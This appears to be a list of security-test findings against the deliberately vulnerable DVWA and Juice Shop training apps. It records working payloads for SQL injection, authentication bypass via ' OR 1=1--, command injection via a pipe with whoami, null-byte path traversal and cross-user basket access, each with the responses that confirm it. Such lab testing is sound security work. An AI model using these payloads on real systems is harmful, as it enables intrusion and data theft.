findings.title: SQL Injection in DVWA SQLi page via out-of-band session-input.php id parameter (high security)
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records (bypassing the underlying LIMIT 1 clause via the trailing '#' comment and OR tautology): ID: 1' OR '1'='1' # First name: admin Surname: admin | First name: Gordon Surname: Brown | First name: Hack Surname: Me | First name: Pablo Surname: Picasso | First name: Bob Surname: Smith. FALSE payload 1' AND '1'='2' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned the normal page with NO result pre_blocks and NO First name/Surname text (zero records). This differential (5 records vs 0 records) with the comment-terminated payload demonstrates SQL injection at DVWA high security level, bypassing both the quote-escaping and the appended LIMIT 1 clause.

findings.title: OS Command Injection in DVWA Command Injection page (high security) via pipe without trailing space
findings.response_evidence: [security=high] Payload 127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist of '; ', '| ' (pipe+space), and '&&') was submitted to POST /vulnerabilities/exec/. The response page's output block (pre_blocks) contained exactly 'www-data', the web server process identity, confirming the whoami command executed on the host via injected shell metacharacter despite the high-security input filter. Page footer confirmed Security Level: high.

findings.title: SQL Injection via numeric boolean payload in id POST parameter (DVWA medium security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} [security=medium]
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} [security=medium]
findings.response_evidence: [security=medium] Security Level confirmed as 'medium' in response (session_info/page footer shows 'Security Level: medium'). TRUE payload id=1 OR 1=1 returned ALL 5 seeded user records (multiple surnames leaked): ID:1 First name: admin Surname: admin | ID:1 First name: Gordon Surname: Brown | ID:1 First name: Hack Surname: Me | ID:1 First name: Pablo Surname: Picasso | ID:1 First name: Bob Surname: Smith. FALSE payload id=1 AND 1=2 returned zero records (no 'First name:'/'Surname:' pre_blocks present in response, only the dropdown form). This confirms unsanitized numeric SQL injection in the id POST parameter at medium security level, since mysql_real_escape_string() only protects quoted strings and does not stop boolean-logic injection on an unquoted numeric parameter.

findings.title: SQL Injection: out-of-band id parameter set via session-input.php (high security) enables SQLi on /vulnerabilities/sqli/
findings.response_evidence: [security=high] session-input.php accepts raw unsanitized 'id' input and stores it in $_SESSION without escaping quotes. Submitting 1' OR '1'='1' # caused the subsequent GET /vulnerabilities/sqli/ to return 5 seeded user records (admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith), while submitting 1' AND '1'='2' # caused GET /vulnerabilities/sqli/ to return zero records. The trailing '#' comment was required to neutralize the server-appended 'LIMIT 1' clause, confirming classic boolean-based SQL injection through this out-of-band input vector at the 'high' DVWA security level.

findings.title: Product Search SQL Injection via unsanitized 'q' parameter
findings.response_evidence: Request 1 (q=qwert') returned HTTP 500 with body: "Error: SQLITE_ERROR: near \"'%'\": syntax error" — proving the single quote breaks out of the backend SQL query unsanitized. Request 2 (9-column UNION SELECT payload) returned HTTP 200 with JSON: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — the literal integers 1-9 reflected back as product fields confirms the UNION SELECT was successfully injected into the query with the correct column count, demonstrating full SQL injection control.

findings.title: Authentication Bypass via SQL Injection in login email field
findings.response_evidence: Response HTTP 200 with body: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The payload "' OR 1=1--" comments out the password check and the resulting SQL query matches the first user row in the DB, returning a valid authentication token for admin@juice-sh.op (umail field explicitly confirms identity) without knowing the real password — confirming SQL injection authentication bypass.

findings.title: Confidential Document Exposure via Open Directory Listing at /ftp/
findings.response_evidence:
Request 1 returned HTTP 200 directory listing (serve-index) at /ftp/ enumerating files including acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml — all accessible without authentication. Request 2 directly retrieved /ftp/acquisitions.md with HTTP 200, content-type text/markdown, containing the confidential memo: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year..." — confirming unauthenticated disclosure of a confidential internal document via open directory listing.

findings.title: Poison Null-Byte Path Traversal bypasses .bak extension filter under /ftp/
findings.response_evidence:
Step 1: GET /ftp/package.json.bak -> HTTP 403, body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js:55 verify() extension blacklist, confirming direct .bak access is blocked.
Step 2: GET /ftp/package.json.bak%2500.md (literal percent-encoded null byte followed by allowed .md extension) -> HTTP 200, content-type application/octet-stream, full contents of package.json returned (e.g. '"name": "juice-shop"', '"version": "6.2.0-SNAPSHOT"', full dependencies/devDependencies lists, repository URL). This demonstrates the extension-filter is bypassed via a poison null byte terminating the filename check while the underlying filesystem read still resolves the original package.json.bak path, disclosing a restricted backup file that is normally blocked.

findings.title: Exposed Encryption Keys Directory Listing (/encryptionkeys/)
findings.response_evidence: HTTP 200, content-type text/html, serve-index generated directory listing titled 'listing directory /encryptionkeys/' enumerating two files with direct download links: 'jwt.pub' (248 bytes) and 'premium.key' (50 bytes), both linked at http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption key material directory is unauthenticated and browsable, exposing sensitive key files (JWT public key and premium feature signing key) per CWE-548 Information Exposure Through Directory Listing.

findings.title: Unauthenticated Access to User Feedback Records Discloses PII (email fragments + UserId)
findings.response_evidence: HTTP 200, JSON array returned without any authentication. Records expose UserId values tied to specific accounts (e.g. {"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"}, {"UserId":2,...,"(***@juice-sh.op)"}, {"UserId":3,...,"(***der@juice-sh.op)"}, {"UserId":21,...,"(***ereum@juice-sh.op)"}). Each authenticated feedback entry embeds a partially-masked author email address (local-part fragment + full domain juice-sh.op) directly correlated to a numeric UserId, which is PII disclosed via a public unauthenticated endpoint — confirming improper exposure of sensitive information to an unauthorized actor (CWE-359).

findings.title: Cross-User Basket Access (BOLA) on GET /rest/basket/{id}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200, basket id=6, UserId=22, Products=[{name:'Apple Juice (1000ml)', BasketItem.quantity:3}]

GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2, own_basket_id=7, UserId=23) -> 200, basket id=6, UserId=22, Products=[{name:'Apple Juice (1000ml)', BasketItem.quantity:3}] -- identical to acct1's basket, retrieved while authenticated as a different user
findings.response_evidence: Step1 (acct1, own basket): {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Step2 (acct2 requesting acct1's basket id=6 while acct2's own_basket_id=7 and UserId=23): identical response body returned: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3,...}}]}}. No authorization check prevented acct2 (UserId 23) from reading acct1's (UserId 22) basket; the server returned the exact same seeded item (Apple Juice 1000ml, qty 3) to both the owner and the unauthorized second user, confirming Broken Object Level Authorization.
